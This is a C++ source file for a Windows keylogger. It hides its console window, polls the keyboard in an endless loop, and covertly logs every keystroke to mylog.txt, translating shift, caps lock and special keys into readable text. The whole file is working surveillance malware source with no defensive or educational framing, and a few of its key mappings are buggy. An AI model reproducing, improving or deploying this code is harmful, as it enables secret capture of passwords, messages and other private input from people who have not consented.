#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <iostream>
#include <string>

using namespace std;

void writeToLog(string text)
{
	ofstream logfile;
	logfile.open("mylog.txt", fstream::app);
	logfile << text;
	logfile.close();
}

void hideConsole()
{
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

int isCapsLock(void)
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}

void processKey(int vkCode)
{
	//cout << "\n\n" << vkCode << "\n\n";

	if ((vkCode >= 39) && (vkCode <= 64)) // Keys 0-9
	{
		// TODO fix to shift key HELD down
		if (GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
		{
			switch (vkCode)
			// 0x30-0x39 is 0-9 respectively
			{
			case 0x30:
				writeToLog(")");
				break;
			case 0x31:
				writeToLog("!");
				break;
			case 0x32:
				writeToLog("@");
				break;
			case 0x33:
				writeToLog("#");
				break;
			case 0x34:
				writeToLog("$");
				break;
			case 0x35:
				writeToLog("%");
				break;
			case 0x36:
				writeToLog("^");
				break;
			case 0x37:
				writeToLog("&");
				break;
			case 0x38:
				writeToLog("*");
				break;
			case 0x39:
				writeToLog("(");
				break;
			}
		}
		else // If shift key is not down
		{
			string s(1, vkCode);
			writeToLog(s);
		}
	}
	else if ((vkCode > 64) && (vkCode < 91)) // Keys a-z
	{
		/*
		 The following is a complicated statement to check if the letters need to be switched to lowercase.
		 Here is an explanation of why the exclusive or (XOR) must be used.

		 Shift   Caps    LowerCase    UpperCase
		 T       T       T            F
		 T       F       F            T
		 F       T       F            T
		 F       F       T            F

		 The above truth table shows what case letters are typed in,
		 based on the state of the shift and caps lock key combinations.

		 The UpperCase column is the same result as a logical XOR.
		 However, since we're checking the opposite in the following if statement, we'll also include a NOT operator (!)
		 Becuase, NOT(XOR) would give us the LowerCase column results.
		 */
		if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) // Check if letters should be lowercase
		{
			vkCode += 32; // Un-capitalize letters
		}

		string s(1, vkCode);
		writeToLog(s);
	}
	else // Every other key
	{
		//cout << "\n\n" << vkCode << "\n\n";
		switch (vkCode)
		// Check for other keys
		{
		case VK_CANCEL:
			writeToLog("[Cancel]");
			break;
		case VK_SPACE:
			writeToLog(" ");
			break;
		case VK_LCONTROL:
			writeToLog("[LCtrl]");
			break;
		case VK_RCONTROL:
			writeToLog("[RCtrl]");
			break;
		case VK_LMENU:
			writeToLog("[LAlt]");
			break;
		case VK_RMENU:
			writeToLog("[RAlt]");
			break;
		case VK_LWIN:
			writeToLog("[LWindows]");
			break;
		case VK_RWIN:
			writeToLog("[RWindows]");
			break;
		case VK_APPS:
			writeToLog("[Applications]");
			break;
		case VK_SNAPSHOT:
			writeToLog("[PrintScreen]");
			break;
		case VK_INSERT:
			writeToLog("[Insert]");
			break;
		case VK_PAUSE:
			writeToLog("[Pause]");
			break;
		case VK_VOLUME_MUTE:
			writeToLog("[VolumeMute]");
			break;
		case VK_VOLUME_DOWN:
			writeToLog("[VolumeDown]");
			break;
		case VK_VOLUME_UP:
			writeToLog("[VolumeUp]");
			break;
		case VK_SELECT:
			writeToLog("[Select]");
			break;
		case VK_HELP:
			writeToLog("[Help]");
			break;
		case VK_EXECUTE:
			writeToLog("[Execute]");
			break;
		case VK_DELETE:
			writeToLog("[Delete]");
			break;
		case VK_CLEAR:
			writeToLog("[Clear]");
			break;
		case VK_RETURN:
			writeToLog("[Enter]");
			break;
		case VK_BACK:
			writeToLog("[Backspace]");
			break;
		case VK_TAB:
			writeToLog("[Tab]");
			break;
		case VK_ESCAPE:
			writeToLog("[Escape]");
			break;
		case VK_LSHIFT:
			writeToLog("[LShift]");
			break;
		case VK_RSHIFT:
			writeToLog("[RShift]");
			break;
		case VK_CAPITAL:
			writeToLog("[CapsLock]");
			break;
		case VK_NUMLOCK:
			writeToLog("[NumLock]");
			break;
		case VK_SCROLL:
			writeToLog("[ScrollLock]");
			break;
		case VK_HOME:
			writeToLog("[Home]");
			break;
		case VK_END:
			writeToLog("[End]");
			break;
		case VK_PLAY:
			writeToLog("[Play]");
			break;
		case VK_ZOOM:
			writeToLog("[Zoom]");
			break;
		case VK_DIVIDE:
			writeToLog("[/]");
			break;
		case VK_MULTIPLY:
			writeToLog("[*]");
			break;
		case VK_SUBTRACT:
			writeToLog("[-]");
			break;
		case VK_ADD:
			writeToLog("[+]");
			break;
		case VK_PRIOR:
			writeToLog("[PageUp]");
			break;
		case VK_NEXT:
			writeToLog("[PageDown]");
			break;
		case VK_LEFT:
			writeToLog("[LArrow]");
			break;
		case VK_RIGHT:
			writeToLog("[RArrow]");
			break;
		case VK_UP:
			writeToLog("[UpArrow]");
			break;
		case VK_DOWN:
			writeToLog("[DownArrow]");
			break;
		case VK_NUMPAD0:
			writeToLog("[0]");
			break;
		case VK_NUMPAD1:
			writeToLog("[1]");
			break;
		case VK_NUMPAD2:
			writeToLog("[2]");
			break;
		case VK_NUMPAD3:
			writeToLog("[3]");
			break;
		case VK_NUMPAD4:
			writeToLog("[4]");
			break;
		case VK_NUMPAD5:
			writeToLog("[5]");
			break;
		case VK_NUMPAD6:
			writeToLog("[6]");
			break;
		case VK_NUMPAD7:
			writeToLog("[7]");
			break;
		case VK_NUMPAD8:
			writeToLog("[8]");
			break;
		case VK_NUMPAD9:
			writeToLog("[9]");
			break;
		case VK_F1:
			writeToLog("[F1]");
			break;
		case VK_F2:
			writeToLog("[F2]");
			break;
		case VK_F3:
			writeToLog("[F3]");
			break;
		case VK_F4:
			writeToLog("[F4]");
			break;
		case VK_F5:
			writeToLog("[F5]");
			break;
		case VK_F6:
			writeToLog("[F6]");
			break;
		case VK_F7:
			writeToLog("[F7]");
			break;
		case VK_F8:
			writeToLog("[F8]");
			break;
		case VK_F9:
			writeToLog("[F9]");
			break;
		case VK_F10:
			writeToLog("[F10]");
			break;
		case VK_F11:
			writeToLog("[F11]");
			break;
		case VK_F12:
			writeToLog("[F12]");
			break;
		case VK_F13:
			writeToLog("[F13]");
			break;
		case VK_F14:
			writeToLog("[F14]");
			break;
		case VK_F15:
			writeToLog("[F15]");
			break;
		case VK_F16:
			writeToLog("[F16]");
			break;
		case VK_F17:
			writeToLog("[F17]");
			break;
		case VK_F18:
			writeToLog("[F18]");
			break;
		case VK_F19:
			writeToLog("[F19]");
			break;
		case VK_F20:
			writeToLog("[F20]");
			break;
		case VK_F21:
			writeToLog("[F21]");
			break;
		case VK_F22:
			writeToLog("[F22]");
			break;
		case VK_F23:
			writeToLog("[F23]");
			break;
		case VK_F24:
			writeToLog("[F24]");
			break;
		case VK_OEM_2:
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("?");
			else
				writeToLog("/");
			break;
		case VK_OEM_3:
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("~");
			else
				writeToLog("`");
			break;
		case VK_OEM_4:
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("{");
			else
				writeToLog("[");
			break;
		case VK_OEM_5:
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("|");
			else
				writeToLog("\\");
			break;
		case VK_OEM_6:
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("}");
			else
				writeToLog("]");
			break;
		case VK_OEM_7:
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("\\");
			else
				writeToLog("'");
			break;
			break;
		case VK_OEM_COMMA:                //comma
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("<");
			else
				writeToLog(",");
			break;
		case VK_OEM_PERIOD:              //Period
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog(">");
			else
				writeToLog(".");
			break;
		case VK_OEM_1:              //Semi Colon same as VK_OEM_1
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog(":");
			else
				writeToLog(";");
			break;
		case VK_OEM_MINUS:              //Minus
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("_");
			else
				writeToLog("-");
			break;
		case VK_OEM_PLUS:              //Equal
			if (GetAsyncKeyState(VK_SHIFT))
				writeToLog("+");
			else
				writeToLog("=");
			break;
		default:

			/* For More details refer this link http://msdn.microsoft.com/en-us/library/ms646267
			 As mentioned in document of GetKeyNameText http://msdn.microsoft.com/en-us/library/ms646300
			 Scon code is present in 16..23 bits therefor I shifted the code to correct position
			 Same for Extended key flag
			 */
			/*dwMsg += pKeyBoard->scanCode << 16;
			dwMsg += pKeyBoard->flags << 24;*/

			//char key[16];
			/* Retrieves a string that represents the name of a key.
			 1st Parameter dwMsg contains the scan code and Extended flag
			 2nd Parameter lpString: lpszName - The buffer that will receive the key name.
			 3rd Parameter cchSize: The maximum length, in characters, of the key name, including the terminating null character
			 If the function succeeds, a null-terminated string is copied into the specified buffer,
			 and the return value is the length of the string, in characters, not counting the terminating null character.
			 If the function fails, the return value is zero.
			 */
			//GetKeyNameText(dwMsg, key, 15);
			//writeToLog(key);
			break;
		}
	}
}

bool isSpecialKey(int key)
{
	if (key == VK_BACK)
			writeToLog("[BackSpace]");

	else if (key == VK_RETURN)
			writeToLog("\n");

	else if (key == VK_SPACE)
			writeToLog(" ");

	else if (key == VK_TAB)
			writeToLog("[TAB]");

	else if (key == VK_SHIFT)
			writeToLog("[SHIFT]");

	else if (key == VK_CONTROL)
			writeToLog("[CONTROL]");

	else if (key == VK_ESCAPE)
			writeToLog("[ESCAPE]");

	else if (key == VK_END)
			writeToLog("[END]");

	else if (key == VK_HOME)
			writeToLog("HOME");

	else if (key == VK_LEFT)
			writeToLog("[LEFT]");

	else if (key == VK_UP)
			writeToLog("[UP]");

	else if (key == VK_RIGHT)
			writeToLog("[RIGHT]");

	else if (key == VK_DOWN)
			writeToLog("[DOWN]");

	else if (key == VK_OEM_PERIOD || key == VK_DECIMAL)
			writeToLog(".");

	else
		return false;
	
	return true;
}

int main()
{
	hideConsole();
	while (true)
	{
		Sleep(20); // To make sure this program doesn't steal all resources.
		for (int key = 8; key <= 255; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				processKey(key);
				/*if (!isSpecialKey(key))
				{
					string s(1, key);
					writeToLog(s);
				}*/
			}
		}
	}
	
	return 0;
}
